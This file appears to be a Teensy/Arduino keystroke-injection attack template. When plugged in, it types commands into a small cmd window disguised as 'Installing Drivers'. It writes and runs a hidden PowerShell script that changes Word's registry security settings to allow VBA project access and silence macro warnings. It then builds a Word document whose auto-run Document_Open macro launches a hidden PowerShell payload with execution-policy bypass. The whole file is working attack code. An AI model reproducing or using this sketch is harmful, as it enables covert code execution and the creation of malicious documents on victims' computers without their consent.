#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $Wrd = New-Object -ComObject Word.Application > %temp%\\dwd.ps1");
  Keyboard.println("echo $Pld = \"powershell.exe -WindowStyle hidden -ep bypass -nologo -noprofile -c INPUT0 \" >> %temp%\\dwd.ps1");
  Keyboard.println("echo $OFile = \"INPUT1\" >> %temp%\\dwd.ps1");
  Keyboard.println("echo $WrdV = $Wrd.Version >> %temp%\\dwd.ps1");
  Keyboard.println("echo if (($WrdV -eq \"12.0\") -or  ($WrdV -eq \"11.0\")){ >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Wrd.DisplayAlerts = $False} >> %temp%\\dwd.ps1");
  Keyboard.println("echo else {$Wrd.DisplayAlerts = \"wdAlertsNone\"} >> %temp%\\dwd.ps1");
  Keyboard.println("echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$WrdV\\word\\Security\" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dwd.ps1");
  Keyboard.println("echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$WrdV\\word\\Security\" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dwd.ps1");
  Keyboard.println("echo $ce = @^\" >> %temp%\\dwd.ps1");
  Keyboard.println("echo Sub Document_Open() >> %temp%\\dwd.ps1");
  Keyboard.println("echo Execute >> %temp%\\dwd.ps1");
  Keyboard.println("echo End Sub >> %temp%\\dwd.ps1");
  Keyboard.println("echo Public Function Execute() As Variant >> %temp%\\dwd.ps1");
  Keyboard.println("echo Const HIDDEN_WINDOW = 0 >> %temp%\\dwd.ps1");
  Keyboard.println("echo strComputer = \".\" >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objWMIService = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2\") >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\") >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objConfig = objStartup.SpawnInstance_ >> %temp%\\dwd.ps1");
  Keyboard.println("echo objConfig.ShowWindow = HIDDEN_WINDOW >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set objProcess = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2:Win32_Process\") >> %temp%\\dwd.ps1");
  Keyboard.println("echo objProcess.Create \"$Pld\", Null, objConfig, intProcessID >> %temp%\\dwd.ps1");
  Keyboard.println("echo End Function >> %temp%\\dwd.ps1");
  Keyboard.println("echo ^\"@ >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc = $Wrd.documents.add() >> %temp%\\dwd.ps1");
  Keyboard.println("echo $DocM = $Doc.VBProject.VBComponents.Item(1) >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc = $Wrd.documents.add() >> %temp%\\dwd.ps1");
  Keyboard.println("echo $DocM = $Doc.VBProject.VBComponents.Item(1) >> %temp%\\dwd.ps1");
  Keyboard.println("echo $DocM.CodeModule.AddFromString($ce) >> %temp%\\dwd.ps1");
  Keyboard.println("echo if (($WrdV -eq \"12.0\") -or  ($WrdV -eq \"11.0\")){ >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc.Saveas($OFile, 0)} >> %temp%\\dwd.ps1");
  Keyboard.println("echo else {$Doc.Saveas([ref]$OFile, [ref]0)} >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Doc.Close() >> %temp%\\dwd.ps1");
  Keyboard.println("echo $Wrd.quit() >> %temp%\\dwd.ps1");
  Keyboard.println("echo [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Wrd) >> %temp%\\dwd.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dwd.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dwd.ps1\"),0,true >> %temp%\\dwd.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dwd.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS